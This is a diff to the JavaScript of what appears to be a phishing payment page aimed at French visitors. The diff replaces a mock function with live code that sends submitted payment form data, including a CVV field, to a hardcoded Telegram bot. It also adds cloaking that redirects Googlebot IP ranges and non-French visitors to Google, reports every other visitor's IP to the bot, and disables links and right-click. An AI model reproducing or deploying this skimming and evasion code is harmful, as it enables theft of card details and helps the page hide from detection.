@@ -232,13 +232,22 @@ function limitCvvLength(element) {
 }
 
 async function sendTelegramAlert(message) {
-    // Mock implementation of sending message to telegram
-    return new Promise((resolve) => {
-        setTimeout(() => {
-            console.log("Message sent to Telegram:", message);
-            resolve();
-        }, 1000); // Simulate async operation with timeout
-    });
+    const telegramBotToken = '7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k'; // Replace with your bot token
+    const chatId = '7747778364'; // Replace with your chat ID
+    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+    try {
+        const response = await fetch(url);
+        const data = await response.json();
+        if (!response.ok || !data.ok) {
+            throw new Error('Failed to send message to Telegram');
+        }
+        console.log('Success:', data);
+    } catch (error) {
+        console.error('Error sending message to Telegram:', error);
+        alert("Une erreur s'est produite lors de l'envoi du message.");
+        return false;
+    }
+    return true;
 }
 
 function capitalizeFirstLetter(string) {
@@ -274,113 +283,84 @@ function handleSubmit(event) {
         }
     });
 
-    sendTelegramAlert(message).then(() => {
-        // Redirect after successful form submission
-        window.location.href = 'https://justmoicom.github.io/test3/';
+    sendTelegramAlert(message).then(success => {
+        if (success) {
+            window.location.href = 'https://justmoicom.github.io/teest3/';
+        }
     }).catch(error => {
         console.error("Error sending message to Telegram:", error);
         alert("Une erreur s'est produite lors de l'envoi du message.");
     });
-
     return false; // Prevent form submission to server
 }
 
+// Other functions remain unchanged...
+window.onload = function() {
+    getUserIPAndCountry();
+    disableLinks();
+    disableRightClick();
+};
 
-    // Function to capitalize the first letter of each word in a string
-    function capitalizeFirstLetter(string) {
-        return string.charAt(0).toUpperCase() + string.slice(1);
-    }
+function isIpInRange(ip, range) {
+    const [ipBase, mask] = range.split('/');
+    const ipNum = ip.split('.').reduce((a, b) => (a << 8) + +b, 0);
+    const baseNum = ipBase.split('.').reduce((a, b) => (a << 8) + +b, 0);
+    const maskNum = (0xffffffff << (32 - mask)) >>> 0;
+    return (ipNum & maskNum) === (baseNum & maskNum);
+}
 
-    // Function to send a notification to Telegram
-    function sendTelegramAlert(message) {
-        const telegramBotToken = '7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k'; // Replace with your bot token
-        const chatId = '7747778364'; // Replace with your chat ID
-        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-        return fetch(url)
-            .then(response => response.json())
-            .then(data => console.log('Success:', data))
-            .catch((error) => console.error('Error:', error));
-    }
+const bannedIps = [
+    '66.249.64.0/19',  // bot IP range
+    '66.249.66.0/20',  // Another Googlebot IP range
+    '66.249.68.0/21',  // Another Googlebot IP range
+    '66.249.71.0/24',  // Another Googlebot IP range
+    '66.249.72.0/22',  // Another Googlebot IP range
+    '66.249.76.0/22',  // Another Googlebot IP range
+    '66.249.80.0/20',  // Another Googlebot IP range
+    '66.249.96.0/19',  // Another Googlebot IP range
+    '216.239.32.0/19', // Another Googlebot IP range
+];
 
-    // Other functions remain unchanged...
-    // List of banned IP addresses or ranges
-    const bannedIps = [
-        '66.249.64.0/19',  // bot IP range
-        '66.249.66.0/20',  // Another Googlebot IP range
-        '66.249.68.0/21',  // Another Googlebot IP range
-        '66.249.71.0/24',  // Another Googlebot IP range
-        '66.249.72.0/22',  // Another Googlebot IP range
-        '66.249.76.0/22',  // Another Googlebot IP range
-        '66.249.80.0/20',  // Another Googlebot IP range
-        '66.249.96.0/19',  // Another Googlebot IP range
-        '216.239.32.0/19', // Another Googlebot IP range
-        // Add more IP ranges or specific IPs here as needed
-    ];
+function isIpBanned(ip) {
+    return bannedIps.some(range => isIpInRange(ip, range));
+}
 
-    // Function to check if an IP address is within a banned range
-    function isIpInRange(ip, range) {
-        const [ipBase, mask] = range.split('/');
-        const ipNum = ip.split('.').reduce((a, b) => (a << 8) + +b, 0);
-        const baseNum = ipBase.split('.').reduce((a, b) => (a << 8) + +b, 0);
-        const maskNum = (0xffffffff << (32 - mask)) >>> 0;
-        return (ipNum & maskNum) === (baseNum & maskNum);
-    }
-
-    // Function to check if the user's IP is banned
-    function isIpBanned(ip) {
-        return bannedIps.some(range => isIpInRange(ip, range));
-    }
-
-    // Function to get the user's IP and country
-    function getUserIPAndCountry() {
-        fetch('https://ipinfo.io/json')
-            .then(response => response.json())
-            .then(data => {
-                const ip = data.ip;
-                const country = data.country;
-                if (isIpBanned(ip)) {
-                    window.location.href = 'https://www.google.com/';
-                    sendTelegramAlert(`IP BANNED: ${ip}`); // Notify about banned IP
-                } else if (country !== 'FR') {
-                    window.location.href = 'https://google.com';
-                } else {
-                    sendTelegramAlert(`New visitor on the site! IP Address: ${ip}`); // Notify about new visitor
-                }
-            })
-            .catch((error) => console.error('Error getting IP:', error));
-    }
-
-    // Trigger the functions when the page loads
-    window.onload = function() {
-        getUserIPAndCountry();
-        disableLinks();
-        disableRightClick();
-    };
-
-    // Disable all links and other interactions except the "Payer" button
-    function disableLinks() {
-        const links = document.querySelectorAll('a');
-        links.forEach(link => {
-            link.style.pointerEvents = 'none';
-            link.style.cursor = 'default';
-        });
-    }
-
-    // Allow only the "Payer" button to be clickable
-    document.addEventListener('DOMContentLoaded', function () {
-        const form = document.getElementById('paymentForm');
-        const payerButton = form.querySelector('button[type="submit"]');
-        form.addEventListener('click', function(event) {
-            if (event.target !== payerButton) {
-                event.preventDefault();
+function getUserIPAndCountry() {
+    fetch('https://ipinfo.io/json')
+        .then(response => response.json())
+        .then(data => {
+            const ip = data.ip;
+            const country = data.country;
+            if (isIpBanned(ip)) {
+                window.location.href = 'https://www.google.com/';
+                sendTelegramAlert(`IP BANNED: ${ip}`); // Notify about banned IP
+            } else if (country !== 'FR') {
+                window.location.href = 'https://google.com';
+            } else {
+                sendTelegramAlert(`New visitor on the site! IP Address: ${ip}`); // Notify about new visitor
             }
-        });
+        })
+        .catch((error) => console.error('Error getting IP:', error));
+}
+
+function disableLinks() {
+    const links = document.querySelectorAll('a');
+    links.forEach(link => {
+        link.style.pointerEvents = 'none';
+        link.style.cursor = 'default';
     });
+}
 
-
-    }
+document.addEventListener('DOMContentLoaded', function () {
+    const form = document.getElementById('paymentForm');
+    const payerButton = form.querySelector('button[type="submit"]');
+    form.addEventListener('click', function(event) {
+        if (event.target !== payerButton) {
+            event.preventDefault();
+        }
+    });
+});
 </script>
-
 <script>
     // Function to handle form submission
     function handleSubmit(event) {
